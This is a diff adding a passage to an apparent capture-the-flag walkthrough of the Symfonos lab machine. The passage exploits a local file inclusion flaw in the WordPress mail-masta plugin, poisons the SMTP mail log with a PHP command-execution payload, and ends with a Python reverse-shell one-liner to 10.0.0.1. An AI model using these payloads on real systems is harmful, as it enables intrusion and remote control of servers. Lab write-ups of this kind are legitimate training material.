@@ -329,3 +329,50 @@ Now that is interesting look go through the plugins we just found.
 
 Now that is some old plugins let do research on it if it vulnerable.
 
+![image](https://user-images.githubusercontent.com/69868171/156559316-31261f83-64f1-4b79-9ee5-53d22e20f67b.png)
+
+![image](https://user-images.githubusercontent.com/69868171/156559913-2c08c778-bb0e-49d0-aa9c-f44a15d1c3a8.png)
+
+Boom seems both is vulnerable to LFI the first thing is first that come to my mind is to check for the `wp-config.php` . But was able to use the mail masta LFI to read the config file.
+
+```
+http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156565106-05891722-551c-48d9-a00d-e1b32e11f5f8.png)
+
+![image](https://user-images.githubusercontent.com/69868171/156565678-776bfbf9-3c1e-452a-8d93-3e0df2fef0a5.png)
+
+But seems after decoding it and getting the config.php file it not that useful back to our nmap scan to try something else apache log poisoning, SSH log poisoning no luck but we still have a port to try for log poisoning which is SMTP let give it a try.
+
+![image](https://user-images.githubusercontent.com/69868171/156567326-6294bde3-b71e-435f-9cbf-8302bc5f6d18.png)
+
+```
+MAIL FROM:<Muzec@hacker.com>
+RCPT TO:<?php system($_GET['cmd']); ?>
+```
+
+Note: We can ignore the 501 5.1.3 Bad recipient address syntax server response as seen in the above screenshot because ideally the internal email program of the server (victim machine), is expecting us to input an email ID and not the OS commands.
+
+```
+http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
+```
+
+Now we can see the logs.
+
+![image](https://user-images.githubusercontent.com/69868171/156567980-17821be5-cd69-44b2-b6db-8633fe23ee49.png)
+
+Now let try to execute a command.
+
+```
+http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156568137-a02a6026-f64c-4d9e-a05f-2460f95b72df.png)
+
+Now we have RCE let get a reverse shell back to our terminal using `python` .
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
